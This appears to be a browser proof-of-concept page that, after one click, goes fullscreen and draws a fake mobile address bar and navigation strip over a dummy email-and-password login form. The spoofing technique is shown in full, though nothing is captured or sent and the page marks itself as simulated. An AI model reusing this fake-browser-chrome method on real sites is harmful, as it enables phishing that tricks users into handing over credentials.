<html>
<body style="margin:0" onclick="main()">

<center id="start">
    <h1>Click to start PoC</h1>
</center>

<script>
function main() {
    const pointerLockElement =
        document.getElementById('pointerLockElement');
    const fullscreenElement =
        document.getElementById('fullscreenElement');

    fullscreenElement.appendChild(pointerLockElement);

    var div = pointerLockElement;

    div.innerHTML = `
      <div style="
        min-height:100vh;
        background:white;
        font-family:sans-serif;
        box-sizing:border-box;
        padding-bottom:110px;">

        <center style="padding-top:40px">
          <h2>PoC by FARISSAL B</h2>
          <p>Fullscreen and keyboard test</p>

          <input id="email"
            type="text"
            placeholder="Email dummy"
            autocomplete="off"
            onclick="event.stopPropagation()"
            style="width:80%;padding:12px;margin-bottom:15px;
            border:1px solid #757575;border-radius:4px;
            box-sizing:border-box;font-size:16px">

          <br>

          <input id="password"
            type="password"
            placeholder="Sandi dummy"
            autocomplete="off"
            onclick="event.stopPropagation()"
            style="width:80%;padding:12px;margin-bottom:20px;
            border:1px solid #757575;border-radius:4px;
            box-sizing:border-box;font-size:16px">

          <br>

          <button type="button"
            onclick="event.stopPropagation(); alert('PoC test')"
            style="width:80%;padding:12px;background:#1a73e8;
            color:white;border:0;border-radius:4px;font-size:16px">
            Test Alert
          </button>
        </center>

        <div style="
          position:fixed;
          bottom:0;
          left:0;
          width:100%;
          padding:12px 16px 25px;
          background:#292929;
          color:white;
          box-sizing:border-box;">

          <div style="
            min-height:52px;
            border-radius:28px;
            background:#3b3b3b;
            display:flex;
            align-items:center;
            gap:12px;
            padding:0 16px;
            font-size:15px;">
            <span>🔒</span>
            <span style="flex:1">SIMULATED · demo.local</span>
            <span>↻</span>
          </div>

          <div style="
            display:flex;
            justify-content:space-around;
            padding-top:18px;
            font-size:24px;">
            <span>‹</span>
            <span>›</span>
            <span>＋</span>
            <span>▢</span>
            <span>☰</span>
          </div>
        </div>
      </div>
    `;

    document.getElementById('start').style.display = 'none';

    if (div.requestFullscreen) {
        div.requestFullscreen().catch(() => {});
    }

    document.getElementById('email').focus();
}
</script>

<div id="pointerLockElement" style="background:white"></div>
<div id="fullscreenElement" style="background:white"></div>

</body>
</html>
